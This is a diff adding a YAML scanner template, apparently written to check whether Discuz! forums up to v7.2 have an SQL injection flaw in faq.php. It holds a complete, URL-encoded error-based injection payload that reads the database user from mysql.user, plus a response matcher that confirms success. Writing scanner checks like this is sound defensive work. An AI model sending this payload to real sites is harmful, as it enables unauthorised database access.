@@ -1,0 +1,14 @@
+name: poc-yaml-discuz-v72-sqli
+rules:
+  - method: GET
+    path: >-
+      /faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20(select%201%20from%20(select%20count(*),concat((select%20concat(user,0x3a,md5(1234),0x3a)%20from%20mysql.user%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23
+    follow_redirects: false
+    expression: >
+      response.status == 200 && response.body.bcontains(b"81dc9bdb52d04dc20036dbd8313ed055") && response.body.bcontains(b"Discuz! info</b>: MySQL Query Error")
+detail:
+  author: leezp
+  Affected Version: "discuz <=v7.2"
+  vuln_url: "/faq.php?action=grouppermission&gids[99]=%27&gids[100][0]=)%20and%20"
+  links:
+    - https://blog.csdn.net/weixin_40709439/article/details/82780606
